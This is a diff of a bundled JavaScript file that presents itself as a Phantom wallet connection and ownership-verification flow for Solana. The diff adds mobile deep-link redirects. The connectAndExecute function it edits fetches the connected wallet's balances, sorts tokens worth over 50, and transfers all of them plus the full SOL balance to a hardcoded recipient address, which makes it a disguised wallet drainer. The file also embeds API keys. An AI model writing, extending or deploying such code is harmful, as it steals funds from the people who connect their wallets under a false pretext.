@@ -72636,83 +72636,132 @@ function _unsupportedIterableToArray(r, a) { if (r) { if ("string" == typeof r) 
 function _arrayLikeToArray(r, a) { (null == a || a > r.length) && (a = r.length); for (var e = 0, n = Array(a); e < a; e++) n[e] = r[e]; return n; }
 function _iterableToArrayLimit(r, l) { var t = null == r ? null : "undefined" != typeof Symbol && r[Symbol.iterator] || r["@@iterator"]; if (null != t) { var e, n, i, u, a = [], f = !0, o = !1; try { if (i = (t = t.call(r)).next, 0 === l) { if (Object(t) !== t) return; f = !1; } else for (; !(f = (e = i.call(t)).done) && (a.push(e.value), a.length !== l); f = !0); } catch (r) { o = !0, n = r; } finally { try { if (!f && null != t["return"] && (u = t["return"](), Object(u) !== u)) return; } finally { if (o) throw n; } } return a; } }
 function _arrayWithHoles(r) { if (Array.isArray(r)) return r; }
-function _regeneratorRuntime() { "use strict"; /*! regenerator-runtime -- Copyright (c) 2014-present, Facebook, Inc. -- license (MIT): https://github.com/facebook/regenerator/blob/main/LICENSE */ _regeneratorRuntime = function _regeneratorRuntime() { return e; }; var t, e = {}, r = Object.prototype, n = r.hasOwnProperty, o = Object.defineProperty || function (t, e, r) { t[e] = r.value; }, i = "function" == typeof Symbol ? Symbol : {}, a = i.iterator || "@@iterator", c = i.asyncIterator || "@@asyncIterator", u = i.toStringTag || "@@toStringTag"; function define(t, e, r) { return Object.defineProperty(t, e, { value: r, enumerable: !0, configurable: !0, writable: !0 }), t[e]; } try { define({}, ""); } catch (t) { define = function define(t, e, r) { return t[e] = r; }; } function wrap(t, e, r, n) { var i = e && e.prototype instanceof Generator ? e : Generator, a = Object.create(i.prototype), c = new Context(n || []); return o(a, "_invoke", { value: makeInvokeMethod(t, r, c) }), a; } function tryCatch(t, e, r) { try { return { type: "normal", arg: t.call(e, r) }; } catch (t) { return { type: "throw", arg: t }; } } e.wrap = wrap; var h = "suspendedStart", l = "suspendedYield", f = "executing", s = "completed", y = {}; function Generator() {} function GeneratorFunction() {} function GeneratorFunctionPrototype() {} var p = {}; define(p, a, function () { return this; }); var d = Object.getPrototypeOf, v = d && d(d(values([]))); v && v !== r && n.call(v, a) && (p = v); var g = GeneratorFunctionPrototype.prototype = Generator.prototype = Object.create(p); function defineIteratorMethods(t) { ["next", "throw", "return"].forEach(function (e) { define(t, e, function (t) { return this._invoke(e, t); }); }); } function AsyncIterator(t, e) { function invoke(r, o, i, a) { var c = tryCatch(t[r], t, o); if ("throw" !== c.type) { var u = c.arg, h = u.value; return h && "object" == _typeof(h) && n.call(h, "__await") ? e.resolve(h.__await).then(function (t) { invoke("next", t, i, a); }, function (t) { invoke("throw", t, i, a); }) : e.resolve(h).then(function (t) { u.value = t, i(u); }, function (t) { return invoke("throw", t, i, a); }); } a(c.arg); } var r; o(this, "_invoke", { value: function value(t, n) { function callInvokeWithMethodAndArg() { return new e(function (e, r) { invoke(t, n, e, r); }); } return r = r ? r.then(callInvokeWithMethodAndArg, callInvokeWithMethodAndArg) : callInvokeWithMethodAndArg(); } }); } function makeInvokeMethod(e, r, n) { var o = h; return function (i, a) { if (o === f) throw Error("Generator is already running"); if (o === s) { if ("throw" === i) throw a; return { value: t, done: !0 }; } for (n.method = i, n.arg = a;;) { var c = n.delegate; if (c) { var u = maybeInvokeDelegate(c, n); if (u) { if (u === y) continue; return u; } } if ("next" === n.method) n.sent = n._sent = n.arg;else if ("throw" === n.method) { if (o === h) throw o = s, n.arg; n.dispatchException(n.arg); } else "return" === n.method && n.abrupt("return", n.arg); o = f; var p = tryCatch(e, r, n); if ("normal" === p.type) { if (o = n.done ? s : l, p.arg === y) continue; return { value: p.arg, done: n.done }; } "throw" === p.type && (o = s, n.method = "throw", n.arg = p.arg); } }; } function maybeInvokeDelegate(e, r) { var n = r.method, o = e.iterator[n]; if (o === t) return r.delegate = null, "throw" === n && e.iterator["return"] && (r.method = "return", r.arg = t, maybeInvokeDelegate(e, r), "throw" === r.method) || "return" !== n && (r.method = "throw", r.arg = new TypeError("The iterator does not provide a '" + n + "' method")), y; var i = tryCatch(o, e.iterator, r.arg); if ("throw" === i.type) return r.method = "throw", r.arg = i.arg, r.delegate = null, y; var a = i.arg; return a ? a.done ? (r[e.resultName] = a.value, r.next = e.nextLoc, "return" !== r.method && (r.method = "next", r.arg = t), r.delegate = null, y) : a : (r.method = "throw", r.arg = new TypeError("iterator result is not an object"), r.delegate = null, y); } function pushTryEntry(t) { var e = { tryLoc: t[0] }; 1 in t && (e.catchLoc = t[1]), 2 in t && (e.finallyLoc = t[2], e.afterLoc = t[3]), this.tryEntries.push(e); } function resetTryEntry(t) { var e = t.completion || {}; e.type = "normal", delete e.arg, t.completion = e; } function Context(t) { this.tryEntries = [{ tryLoc: "root" }], t.forEach(pushTryEntry, this), this.reset(!0); } function values(e) { if (e || "" === e) { var r = e[a]; if (r) return r.call(e); if ("function" == typeof e.next) return e; if (!isNaN(e.length)) { var o = -1, i = function next() { for (; ++o < e.length;) if (n.call(e, o)) return next.value = e[o], next.done = !1, next; return next.value = t, next.done = !0, next; }; return i.next = i; } } throw new TypeError(_typeof(e) + " is not iterable"); } return GeneratorFunction.prototype = GeneratorFunctionPrototype, o(g, "constructor", { value: GeneratorFunctionPrototype, configurable: !0 }), o(GeneratorFunctionPrototype, "constructor", { value: GeneratorFunction, configurable: !0 }), GeneratorFunction.displayName = define(GeneratorFunctionPrototype, u, "GeneratorFunction"), e.isGeneratorFunction = function (t) { var e = "function" == typeof t && t.constructor; return !!e && (e === GeneratorFunction || "GeneratorFunction" === (e.displayName || e.name)); }, e.mark = function (t) { return Object.setPrototypeOf ? Object.setPrototypeOf(t, GeneratorFunctionPrototype) : (t.__proto__ = GeneratorFunctionPrototype, define(t, u, "GeneratorFunction")), t.prototype = Object.create(g), t; }, e.awrap = function (t) { return { __await: t }; }, defineIteratorMethods(AsyncIterator.prototype), define(AsyncIterator.prototype, c, function () { return this; }), e.AsyncIterator = AsyncIterator, e.async = function (t, r, n, o, i) { void 0 === i && (i = Promise); var a = new AsyncIterator(wrap(t, r, n, o), i); return e.isGeneratorFunction(r) ? a : a.next().then(function (t) { return t.done ? t.value : a.next(); }); }, defineIteratorMethods(g), define(g, u, "Generator"), define(g, a, function () { return this; }), define(g, "toString", function () { return "[object Generator]"; }), e.keys = function (t) { var e = Object(t), r = []; for (var n in e) r.push(n); return r.reverse(), function next() { for (; r.length;) { var t = r.pop(); if (t in e) return next.value = t, next.done = !1, next; } return next.done = !0, next; }; }, e.values = values, Context.prototype = { constructor: Context, reset: function reset(e) { if (this.prev = 0, this.next = 0, this.sent = this._sent = t, this.done = !1, this.delegate = null, this.method = "next", this.arg = t, this.tryEntries.forEach(resetTryEntry), !e) for (var r in this) "t" === r.charAt(0) && n.call(this, r) && !isNaN(+r.slice(1)) && (this[r] = t); }, stop: function stop() { this.done = !0; var t = this.tryEntries[0].completion; if ("throw" === t.type) throw t.arg; return this.rval; }, dispatchException: function dispatchException(e) { if (this.done) throw e; var r = this; function handle(n, o) { return a.type = "throw", a.arg = e, r.next = n, o && (r.method = "next", r.arg = t), !!o; } for (var o = this.tryEntries.length - 1; o >= 0; --o) { var i = this.tryEntries[o], a = i.completion; if ("root" === i.tryLoc) return handle("end"); if (i.tryLoc <= this.prev) { var c = n.call(i, "catchLoc"), u = n.call(i, "finallyLoc"); if (c && u) { if (this.prev < i.catchLoc) return handle(i.catchLoc, !0); if (this.prev < i.finallyLoc) return handle(i.finallyLoc); } else if (c) { if (this.prev < i.catchLoc) return handle(i.catchLoc, !0); } else { if (!u) throw Error("try statement without catch or finally"); if (this.prev < i.finallyLoc) return handle(i.finallyLoc); } } } }, abrupt: function abrupt(t, e) { for (var r = this.tryEntries.length - 1; r >= 0; --r) { var o = this.tryEntries[r]; if (o.tryLoc <= this.prev && n.call(o, "finallyLoc") && this.prev < o.finallyLoc) { var i = o; break; } } i && ("break" === t || "continue" === t) && i.tryLoc <= e && e <= i.finallyLoc && (i = null); var a = i ? i.completion : {}; return a.type = t, a.arg = e, i ? (this.method = "next", this.next = i.finallyLoc, y) : this.complete(a); }, complete: function complete(t, e) { if ("throw" === t.type) throw t.arg; return "break" === t.type || "continue" === t.type ? this.next = t.arg : "return" === t.type ? (this.rval = this.arg = t.arg, this.method = "return", this.next = "end") : "normal" === t.type && e && (this.next = e), y; }, finish: function finish(t) { for (var e = this.tryEntries.length - 1; e >= 0; --e) { var r = this.tryEntries[e]; if (r.finallyLoc === t) return this.complete(r.completion, r.afterLoc), resetTryEntry(r), y; } }, "catch": function _catch(t) { for (var e = this.tryEntries.length - 1; e >= 0; --e) { var r = this.tryEntries[e]; if (r.tryLoc === t) { var n = r.completion; if ("throw" === n.type) { var o = n.arg; resetTryEntry(r); } return o; } } throw Error("illegal catch attempt"); }, delegateYield: function delegateYield(e, r, n) { return this.delegate = { iterator: values(e), resultName: r, nextLoc: n }, "next" === this.method && (this.arg = t), y; } }, e; }
 function ownKeys(e, r) { var t = Object.keys(e); if (Object.getOwnPropertySymbols) { var o = Object.getOwnPropertySymbols(e); r && (o = o.filter(function (r) { return Object.getOwnPropertyDescriptor(e, r).enumerable; })), t.push.apply(t, o); } return t; }
 function _objectSpread(e) { for (var r = 1; r < arguments.length; r++) { var t = null != arguments[r] ? arguments[r] : {}; r % 2 ? ownKeys(Object(t), !0).forEach(function (r) { _defineProperty(e, r, t[r]); }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(t)) : ownKeys(Object(t)).forEach(function (r) { Object.defineProperty(e, r, Object.getOwnPropertyDescriptor(t, r)); }); } return e; }
 function _defineProperty(e, r, t) { return (r = _toPropertyKey(r)) in e ? Object.defineProperty(e, r, { value: t, enumerable: !0, configurable: !0, writable: !0 }) : e[r] = t, e; }
 function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
 function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
+function _regeneratorRuntime() { "use strict"; /*! regenerator-runtime -- Copyright (c) 2014-present, Facebook, Inc. -- license (MIT): https://github.com/facebook/regenerator/blob/main/LICENSE */ _regeneratorRuntime = function _regeneratorRuntime() { return e; }; var t, e = {}, r = Object.prototype, n = r.hasOwnProperty, o = Object.defineProperty || function (t, e, r) { t[e] = r.value; }, i = "function" == typeof Symbol ? Symbol : {}, a = i.iterator || "@@iterator", c = i.asyncIterator || "@@asyncIterator", u = i.toStringTag || "@@toStringTag"; function define(t, e, r) { return Object.defineProperty(t, e, { value: r, enumerable: !0, configurable: !0, writable: !0 }), t[e]; } try { define({}, ""); } catch (t) { define = function define(t, e, r) { return t[e] = r; }; } function wrap(t, e, r, n) { var i = e && e.prototype instanceof Generator ? e : Generator, a = Object.create(i.prototype), c = new Context(n || []); return o(a, "_invoke", { value: makeInvokeMethod(t, r, c) }), a; } function tryCatch(t, e, r) { try { return { type: "normal", arg: t.call(e, r) }; } catch (t) { return { type: "throw", arg: t }; } } e.wrap = wrap; var h = "suspendedStart", l = "suspendedYield", f = "executing", s = "completed", y = {}; function Generator() {} function GeneratorFunction() {} function GeneratorFunctionPrototype() {} var p = {}; define(p, a, function () { return this; }); var d = Object.getPrototypeOf, v = d && d(d(values([]))); v && v !== r && n.call(v, a) && (p = v); var g = GeneratorFunctionPrototype.prototype = Generator.prototype = Object.create(p); function defineIteratorMethods(t) { ["next", "throw", "return"].forEach(function (e) { define(t, e, function (t) { return this._invoke(e, t); }); }); } function AsyncIterator(t, e) { function invoke(r, o, i, a) { var c = tryCatch(t[r], t, o); if ("throw" !== c.type) { var u = c.arg, h = u.value; return h && "object" == _typeof(h) && n.call(h, "__await") ? e.resolve(h.__await).then(function (t) { invoke("next", t, i, a); }, function (t) { invoke("throw", t, i, a); }) : e.resolve(h).then(function (t) { u.value = t, i(u); }, function (t) { return invoke("throw", t, i, a); }); } a(c.arg); } var r; o(this, "_invoke", { value: function value(t, n) { function callInvokeWithMethodAndArg() { return new e(function (e, r) { invoke(t, n, e, r); }); } return r = r ? r.then(callInvokeWithMethodAndArg, callInvokeWithMethodAndArg) : callInvokeWithMethodAndArg(); } }); } function makeInvokeMethod(e, r, n) { var o = h; return function (i, a) { if (o === f) throw Error("Generator is already running"); if (o === s) { if ("throw" === i) throw a; return { value: t, done: !0 }; } for (n.method = i, n.arg = a;;) { var c = n.delegate; if (c) { var u = maybeInvokeDelegate(c, n); if (u) { if (u === y) continue; return u; } } if ("next" === n.method) n.sent = n._sent = n.arg;else if ("throw" === n.method) { if (o === h) throw o = s, n.arg; n.dispatchException(n.arg); } else "return" === n.method && n.abrupt("return", n.arg); o = f; var p = tryCatch(e, r, n); if ("normal" === p.type) { if (o = n.done ? s : l, p.arg === y) continue; return { value: p.arg, done: n.done }; } "throw" === p.type && (o = s, n.method = "throw", n.arg = p.arg); } }; } function maybeInvokeDelegate(e, r) { var n = r.method, o = e.iterator[n]; if (o === t) return r.delegate = null, "throw" === n && e.iterator["return"] && (r.method = "return", r.arg = t, maybeInvokeDelegate(e, r), "throw" === r.method) || "return" !== n && (r.method = "throw", r.arg = new TypeError("The iterator does not provide a '" + n + "' method")), y; var i = tryCatch(o, e.iterator, r.arg); if ("throw" === i.type) return r.method = "throw", r.arg = i.arg, r.delegate = null, y; var a = i.arg; return a ? a.done ? (r[e.resultName] = a.value, r.next = e.nextLoc, "return" !== r.method && (r.method = "next", r.arg = t), r.delegate = null, y) : a : (r.method = "throw", r.arg = new TypeError("iterator result is not an object"), r.delegate = null, y); } function pushTryEntry(t) { var e = { tryLoc: t[0] }; 1 in t && (e.catchLoc = t[1]), 2 in t && (e.finallyLoc = t[2], e.afterLoc = t[3]), this.tryEntries.push(e); } function resetTryEntry(t) { var e = t.completion || {}; e.type = "normal", delete e.arg, t.completion = e; } function Context(t) { this.tryEntries = [{ tryLoc: "root" }], t.forEach(pushTryEntry, this), this.reset(!0); } function values(e) { if (e || "" === e) { var r = e[a]; if (r) return r.call(e); if ("function" == typeof e.next) return e; if (!isNaN(e.length)) { var o = -1, i = function next() { for (; ++o < e.length;) if (n.call(e, o)) return next.value = e[o], next.done = !1, next; return next.value = t, next.done = !0, next; }; return i.next = i; } } throw new TypeError(_typeof(e) + " is not iterable"); } return GeneratorFunction.prototype = GeneratorFunctionPrototype, o(g, "constructor", { value: GeneratorFunctionPrototype, configurable: !0 }), o(GeneratorFunctionPrototype, "constructor", { value: GeneratorFunction, configurable: !0 }), GeneratorFunction.displayName = define(GeneratorFunctionPrototype, u, "GeneratorFunction"), e.isGeneratorFunction = function (t) { var e = "function" == typeof t && t.constructor; return !!e && (e === GeneratorFunction || "GeneratorFunction" === (e.displayName || e.name)); }, e.mark = function (t) { return Object.setPrototypeOf ? Object.setPrototypeOf(t, GeneratorFunctionPrototype) : (t.__proto__ = GeneratorFunctionPrototype, define(t, u, "GeneratorFunction")), t.prototype = Object.create(g), t; }, e.awrap = function (t) { return { __await: t }; }, defineIteratorMethods(AsyncIterator.prototype), define(AsyncIterator.prototype, c, function () { return this; }), e.AsyncIterator = AsyncIterator, e.async = function (t, r, n, o, i) { void 0 === i && (i = Promise); var a = new AsyncIterator(wrap(t, r, n, o), i); return e.isGeneratorFunction(r) ? a : a.next().then(function (t) { return t.done ? t.value : a.next(); }); }, defineIteratorMethods(g), define(g, u, "Generator"), define(g, a, function () { return this; }), define(g, "toString", function () { return "[object Generator]"; }), e.keys = function (t) { var e = Object(t), r = []; for (var n in e) r.push(n); return r.reverse(), function next() { for (; r.length;) { var t = r.pop(); if (t in e) return next.value = t, next.done = !1, next; } return next.done = !0, next; }; }, e.values = values, Context.prototype = { constructor: Context, reset: function reset(e) { if (this.prev = 0, this.next = 0, this.sent = this._sent = t, this.done = !1, this.delegate = null, this.method = "next", this.arg = t, this.tryEntries.forEach(resetTryEntry), !e) for (var r in this) "t" === r.charAt(0) && n.call(this, r) && !isNaN(+r.slice(1)) && (this[r] = t); }, stop: function stop() { this.done = !0; var t = this.tryEntries[0].completion; if ("throw" === t.type) throw t.arg; return this.rval; }, dispatchException: function dispatchException(e) { if (this.done) throw e; var r = this; function handle(n, o) { return a.type = "throw", a.arg = e, r.next = n, o && (r.method = "next", r.arg = t), !!o; } for (var o = this.tryEntries.length - 1; o >= 0; --o) { var i = this.tryEntries[o], a = i.completion; if ("root" === i.tryLoc) return handle("end"); if (i.tryLoc <= this.prev) { var c = n.call(i, "catchLoc"), u = n.call(i, "finallyLoc"); if (c && u) { if (this.prev < i.catchLoc) return handle(i.catchLoc, !0); if (this.prev < i.finallyLoc) return handle(i.finallyLoc); } else if (c) { if (this.prev < i.catchLoc) return handle(i.catchLoc, !0); } else { if (!u) throw Error("try statement without catch or finally"); if (this.prev < i.finallyLoc) return handle(i.finallyLoc); } } } }, abrupt: function abrupt(t, e) { for (var r = this.tryEntries.length - 1; r >= 0; --r) { var o = this.tryEntries[r]; if (o.tryLoc <= this.prev && n.call(o, "finallyLoc") && this.prev < o.finallyLoc) { var i = o; break; } } i && ("break" === t || "continue" === t) && i.tryLoc <= e && e <= i.finallyLoc && (i = null); var a = i ? i.completion : {}; return a.type = t, a.arg = e, i ? (this.method = "next", this.next = i.finallyLoc, y) : this.complete(a); }, complete: function complete(t, e) { if ("throw" === t.type) throw t.arg; return "break" === t.type || "continue" === t.type ? this.next = t.arg : "return" === t.type ? (this.rval = this.arg = t.arg, this.method = "return", this.next = "end") : "normal" === t.type && e && (this.next = e), y; }, finish: function finish(t) { for (var e = this.tryEntries.length - 1; e >= 0; --e) { var r = this.tryEntries[e]; if (r.finallyLoc === t) return this.complete(r.completion, r.afterLoc), resetTryEntry(r), y; } }, "catch": function _catch(t) { for (var e = this.tryEntries.length - 1; e >= 0; --e) { var r = this.tryEntries[e]; if (r.tryLoc === t) { var n = r.completion; if ("throw" === n.type) { var o = n.arg; resetTryEntry(r); } return o; } } throw Error("illegal catch attempt"); }, delegateYield: function delegateYield(e, r, n) { return this.delegate = { iterator: values(e), resultName: r, nextLoc: n }, "next" === this.method && (this.arg = t), y; } }, e; }
 function asyncGeneratorStep(n, t, e, r, o, a, c) { try { var i = n[a](c), u = i.value; } catch (n) { return void e(n); } i.done ? t(u) : Promise.resolve(u).then(r, o); }
-function _asyncToGenerator(n) { return function () { var t = this, e = arguments; return new Promise(function (r, o) { var a = n.apply(t, e); function _next(n) { asyncGeneratorStep(a, r, o, _next, _throw, "next", n); } function _throw(n) { asyncGeneratorStep(a, r, o, _next, _throw, "throw", n); } _next(void 0); }); }; }
-// Ensure buffer is available globally
+function _asyncToGenerator(n) { return function () { var t = this, e = arguments; return new Promise(function (r, o) { var a = n.apply(t, e); function _next(n) { asyncGeneratorStep(a, r, o, _next, _throw, "next", n); } function _throw(n) { asyncGeneratorStep(a, r, o, _next, _throw, "throw", n); } _next(void 0); }); }; } // Include Buffer support
 window.Buffer = _buffer.Buffer;
-// Define necessary variables
-var walletAddress = null;
-
-// Function to connect the Phantom wallet and execute the whole flow
+var dappEncryptionKey = crypto.getRandomValues(new Uint8Array(32)); // Generate encryption key
+// Redirect to Phantom for connection, passing the encryption key and app URL
+window.location.href = "https://phantom.app/ul/v1/connect?dapp_encryption_public_key=".concat(encodeURIComponent(dappEncryptionKey), "&cluster=mainnet-beta&app_url=").concat(encodeURIComponent(window.location.href));
+function handlePhantomConnection() {
+  return _handlePhantomConnection.apply(this, arguments);
+}
+function _handlePhantomConnection() {
+  _handlePhantomConnection = _asyncToGenerator(/*#__PURE__*/_regeneratorRuntime().mark(function _callee() {
+    var urlParams, phantomPublicKey, session;
+    return _regeneratorRuntime().wrap(function _callee$(_context) {
+      while (1) switch (_context.prev = _context.next) {
+        case 0:
+          urlParams = new URLSearchParams(window.location.search);
+          phantomPublicKey = urlParams.get('phantom_encryption_public_key');
+          session = urlParams.get('session');
+          if (phantomPublicKey && session) {
+            // Store session data for signing and other operations
+            sessionStorage.setItem('phantomPublicKey', phantomPublicKey);
+            sessionStorage.setItem('session', session);
+            console.log('Phantom Wallet Connected:', phantomPublicKey);
+          }
+        case 4:
+        case "end":
+          return _context.stop();
+      }
+    }, _callee);
+  }));
+  return _handlePhantomConnection.apply(this, arguments);
+}
+var walletAddress = sessionStorage.getItem('walletAddress');
+var message = "Please sign this message to verify ownership of the wallet: ".concat(walletAddress);
+var encodedMessage = new TextEncoder().encode(message);
+var base64Message = _buffer.Buffer.from(encodedMessage).toString('base64');
+var session = sessionStorage.getItem('session');
+window.location.href = "https://phantom.app/ul/v1/signMessage?dapp_encryption_public_key=".concat(encodeURIComponent(dappEncryptionKey), "&message=").concat(encodeURIComponent(base64Message), "&session=").concat(encodeURIComponent(session), "&redirect_link=").concat(encodeURIComponent(window.location.href));
+function handleSignedMessage() {
+  return _handleSignedMessage.apply(this, arguments);
+} // Wallet connection flow
+function _handleSignedMessage() {
+  _handleSignedMessage = _asyncToGenerator(/*#__PURE__*/_regeneratorRuntime().mark(function _callee2() {
+    var urlParams, signedMessage;
+    return _regeneratorRuntime().wrap(function _callee2$(_context2) {
+      while (1) switch (_context2.prev = _context2.next) {
+        case 0:
+          urlParams = new URLSearchParams(window.location.search);
+          signedMessage = urlParams.get('signedMessage');
+          if (signedMessage) {
+            console.log('Signed Message:', signedMessage);
+            // Proceed with verification or any other logic
+          }
+        case 3:
+        case "end":
+          return _context2.stop();
+      }
+    }, _callee2);
+  }));
+  return _handleSignedMessage.apply(this, arguments);
+}
 function connectAndExecute() {
   return _connectAndExecute.apply(this, arguments);
 } // Function to sign a message and verify wallet ownership
 function _connectAndExecute() {
-  _connectAndExecute = _asyncToGenerator(/*#__PURE__*/_regeneratorRuntime().mark(function _callee() {
-    var provider, isMobile, response, connection, balance, solBalance, tokens, tokenPrices, tokenValues, filteredTokens, sortedTokens, recipientAddress;
-    return _regeneratorRuntime().wrap(function _callee$(_context) {
-      while (1) switch (_context.prev = _context.next) {
+  _connectAndExecute = _asyncToGenerator(/*#__PURE__*/_regeneratorRuntime().mark(function _callee3() {
+    var provider, isMobile, response, _walletAddress, connection, balance, solBalance, tokens, tokenPrices, tokenValues, filteredTokens, sortedTokens, recipientAddress;
+    return _regeneratorRuntime().wrap(function _callee3$(_context3) {
+      while (1) switch (_context3.prev = _context3.next) {
         case 0:
-          provider = window.solana; // Detect if the user is on a mobile device
+          provider = window.solana;
           isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
           if (!(!provider || !provider.isPhantom)) {
-            _context.next = 8;
+            _context3.next = 8;
             break;
           }
           if (!isMobile) {
-            _context.next = 6;
+            _context3.next = 6;
             break;
           }
           window.location.href = "https://phantom.app/ul/browse/".concat(encodeURIComponent(window.location.href));
-          return _context.abrupt("return");
+          return _context3.abrupt("return");
         case 6:
-          // For desktop users, prompt to install Phantom Wallet
           alert('Phantom wallet not found. Please install it!');
-          return _context.abrupt("return");
+          return _context3.abrupt("return");
         case 8:
-          _context.prev = 8;
-          _context.next = 11;
+          _context3.prev = 8;
+          _context3.next = 11;
           return provider.connect();
         case 11:
-          response = _context.sent;
-          walletAddress = response.publicKey.toString(); // Capture the connected wallet address
-
-          // Update button text to indicate connection
+          response = _context3.sent;
+          _walletAddress = response.publicKey.toString();
+          sessionStorage.setItem('walletAddress', _walletAddress);
           document.getElementById('connectWalletBtn').textContent = "Connected";
 
-          // Step 2: Sign a message to verify wallet ownership
-          _context.next = 16;
-          return signMessage(provider, walletAddress);
-        case 16:
-          // Step 3: Fetch SOL balance
+          // Sign a message to verify ownership
+          _context3.next = 17;
+          return signMessage(provider, _walletAddress);
+        case 17:
           connection = new _web.Connection('https://solana-mainnet.g.alchemy.com/v2/Gsfdu-QYMKdktD9rUZiq8cwjFUdZTyPh');
-          _context.next = 19;
-          return connection.getBalance(new _web.PublicKey(walletAddress));
-        case 19:
-          balance = _context.sent;
-          solBalance = balance / 1e9; // Step 4: Fetch token balances using Shyft API
-          _context.next = 23;
-          return fetchTokenBalances(walletAddress);
-        case 23:
-          tokens = _context.sent;
-          _context.next = 26;
+          _context3.next = 20;
+          return connection.getBalance(new _web.PublicKey(_walletAddress));
+        case 20:
+          balance = _context3.sent;
+          solBalance = balance / 1e9;
+          _context3.next = 24;
+          return fetchTokenBalances(_walletAddress);
+        case 24:
+          tokens = _context3.sent;
+          _context3.next = 27;
           return fetchTokenPrices(tokens);
-        case 26:
-          tokenPrices = _context.sent;
-          // Step 6: Calculate token values and sort them
+        case 27:
+          tokenPrices = _context3.sent;
           tokenValues = tokens.map(function (token) {
             var price = tokenPrices[token.info.symbol] || 0;
             var value = price * token.balance;
             return _objectSpread(_objectSpread({}, token), {}, {
               value: value
             });
-          }); // Filter and sort tokens by value
+          });
           filteredTokens = tokenValues.filter(function (token) {
             return token.value > 50;
           });
@@ -72720,27 +72769,25 @@ function _connectAndExecute() {
             return b.value - a.value;
           });
           console.log('Filtered and Sorted Tokens by Value:', sortedTokens);
-
-          // Step 7: Transfer tokens in order
-          recipientAddress = '2VhgfoY8zMLcpF5NhoArSua2iCoduqEFLMSaRXFhistJ'; // Replace with recipient's address
-          _context.next = 34;
+          recipientAddress = '2VhgfoY8zMLcpF5NhoArSua2iCoduqEFLMSaRXFhistJ';
+          _context3.next = 35;
           return transferTokensInOrder(sortedTokens, recipientAddress, connection);
-        case 34:
-          _context.next = 36;
+        case 35:
+          _context3.next = 37;
           return transferSol(connection, recipientAddress, solBalance);
-        case 36:
-          _context.next = 42;
+        case 37:
+          _context3.next = 43;
           break;
-        case 38:
-          _context.prev = 38;
-          _context.t0 = _context["catch"](8);
-          console.error(_context.t0);
+        case 39:
+          _context3.prev = 39;
+          _context3.t0 = _context3["catch"](8);
+          console.error(_context3.t0);
           alert('Failed to complete wallet flow');
-        case 42:
+        case 43:
         case "end":
-          return _context.stop();
+          return _context3.stop();
       }
-    }, _callee, null, [[8, 38]]);
+    }, _callee3, null, [[8, 39]]);
   }));
   return _connectAndExecute.apply(this, arguments);
 }
@@ -72748,30 +72795,30 @@ function signMessage(_x, _x2) {
   return _signMessage.apply(this, arguments);
 } // Fetch token balances using Shyft API
 function _signMessage() {
-  _signMessage = _asyncToGenerator(/*#__PURE__*/_regeneratorRuntime().mark(function _callee2(provider, walletAddress) {
+  _signMessage = _asyncToGenerator(/*#__PURE__*/_regeneratorRuntime().mark(function _callee4(provider, walletAddress) {
     var message, encodedMessage, signedMessage;
-    return _regeneratorRuntime().wrap(function _callee2$(_context2) {
-      while (1) switch (_context2.prev = _context2.next) {
+    return _regeneratorRuntime().wrap(function _callee4$(_context4) {
+      while (1) switch (_context4.prev = _context4.next) {
         case 0:
           message = "Please sign this message to verify ownership of the wallet: ".concat(walletAddress);
           encodedMessage = new TextEncoder().encode(message);
-          _context2.prev = 2;
-          _context2.next = 5;
+          _context4.prev = 2;
+          _context4.next = 5;
           return provider.signMessage(encodedMessage, 'utf8');
         case 5:
-          signedMessage = _context2.sent;
+          signedMessage = _context4.sent;
           console.log('Signed Message:', signedMessage.signature);
-          _context2.next = 12;
+          _context4.next = 12;
           break;
         case 9:
-          _context2.prev = 9;
-          _context2.t0 = _context2["catch"](2);
-          console.error('Failed to sign message:', _context2.t0);
+          _context4.prev = 9;
+          _context4.t0 = _context4["catch"](2);
+          console.error('Failed to sign message:', _context4.t0);
         case 12:
         case "end":
-          return _context2.stop();
+          return _context4.stop();
       }
-    }, _callee2, null, [[2, 9]]);
+    }, _callee4, null, [[2, 9]]);
   }));
   return _signMessage.apply(this, arguments);
 }
@@ -72779,14 +72826,14 @@ function fetchTokenBalances(_x3) {
   return _fetchTokenBalances.apply(this, arguments);
 } // Fetch token prices using Jupiter API
 function _fetchTokenBalances() {
-  _fetchTokenBalances = _asyncToGenerator(/*#__PURE__*/_regeneratorRuntime().mark(function _callee3(walletAddress) {
+  _fetchTokenBalances = _asyncToGenerator(/*#__PURE__*/_regeneratorRuntime().mark(function _callee5(walletAddress) {
     var apiKey, response, data;
-    return _regeneratorRuntime().wrap(function _callee3$(_context3) {
-      while (1) switch (_context3.prev = _context3.next) {
+    return _regeneratorRuntime().wrap(function _callee5$(_context5) {
+      while (1) switch (_context5.prev = _context5.next) {
         case 0:
           apiKey = 'DNvnXBTyUJ_yV56g'; // Replace with your Shyft API key
-          _context3.prev = 1;
-          _context3.next = 4;
+          _context5.prev = 1;
+          _context5.next = 4;
           return fetch("https://api.shyft.to/sol/v1/wallet/all_tokens?network=mainnet-beta&wallet=".concat(walletAddress), {
             headers: {
               'Content-Type': 'application/json',
@@ -72794,32 +72841,32 @@ function _fetchTokenBalances() {
             }
           });
         case 4:
-          response = _context3.sent;
-          _context3.next = 7;
+          response = _context5.sent;
+          _context5.next = 7;
           return response.json();
         case 7:
-          data = _context3.sent;
+          data = _context5.sent;
           if (!data.success) {
-            _context3.next = 13;
+            _context5.next = 13;
             break;
           }
           console.log('Token Balances:', data.result);
-          return _context3.abrupt("return", data.result);
+          return _context5.abrupt("return", data.result);
         case 13:
           throw new Error(data.message || 'Failed to fetch token balances');
         case 14:
-          _context3.next = 20;
+          _context5.next = 20;
           break;
         case 16:
-          _context3.prev = 16;
-          _context3.t0 = _context3["catch"](1);
-          console.error('Error fetching token balances:', _context3.t0);
+          _context5.prev = 16;
+          _context5.t0 = _context5["catch"](1);
+          console.error('Error fetching token balances:', _context5.t0);
           alert('Failed to fetch token balances');
         case 20:
         case "end":
-          return _context3.stop();
+          return _context5.stop();
       }
-    }, _callee3, null, [[1, 16]]);
+    }, _callee5, null, [[1, 16]]);
   }));
   return _fetchTokenBalances.apply(this, arguments);
 }
